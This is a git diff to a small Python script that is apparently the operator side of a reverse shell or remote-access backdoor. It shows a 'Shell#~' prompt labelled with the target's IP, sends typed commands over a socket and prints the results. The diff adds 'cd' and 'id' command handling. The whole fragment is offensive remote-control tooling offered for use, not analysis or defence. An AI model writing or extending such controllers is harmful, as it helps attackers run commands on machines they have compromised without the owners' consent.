@@ -6,6 +6,7 @@
 
 import socket
 import json
+import os
 
 def reliable_send(data):
 	json_data = json.dumps(data).encode()
@@ -22,12 +23,21 @@ def reliable_recv():
 
 def shell():
 	while True:
-		command = input("* Shell#~%s: " % str(ip)) # %s outputs the IP of target 
+		command = input("* Shell#~%s: " % str(ip)) # %s  is the IP to be attached to this string
 		reliable_send(command)
 		if command == "q":
                 	break
-		elif command[:2] == "cd":
-					continue
+		elif command[:2] == "cd" and len(command) > 1:
+			try:
+				os.chdir(command[3:])
+			except:
+				continue
+		elif command == "id":
+			try:
+				user = os.getlogin()
+				print(user)
+			except:
+				continue
 		else:
 				result = reliable_recv()
 				print (result)
